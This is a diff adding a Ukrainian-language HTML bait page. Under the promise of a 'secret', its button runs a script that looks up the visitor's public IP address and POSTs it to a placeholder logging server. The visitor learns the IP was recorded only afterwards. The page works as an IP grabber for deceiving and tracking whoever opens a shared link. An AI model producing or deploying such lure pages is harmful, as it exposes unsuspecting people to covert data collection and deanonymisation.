@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Секрет для тебе!</title>
+</head>
+<body>
+  <h1>Глянь, що я знайшов для тебе!</h1>
+  <p>Натисни кнопку, щоб побачити секрет...</p>
+  <button onclick="sendIP()">Показати!</button>
+  <script>
+    async function sendIP() {
+      // Отримуємо IP користувача через API
+      const response = await fetch('https://api.ipify.org?format=json');
+      const data = await response.json();
+      const ip = data.ip;
+
+      // Відправляємо IP на наш "сервер" (поки вкажемо заглушку)
+      fetch('ТВІЙ_БЕЗКОШТОВНИЙ_СЕРВЕР_ДЛЯ_ЛОГІВ', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ ip: ip })
+      })
+      .then(response => response.text())
+      .then(data => alert('Дякую за відвідування! Твій IP записано.'));
+    }
+  </script>
+</body>
+</html>
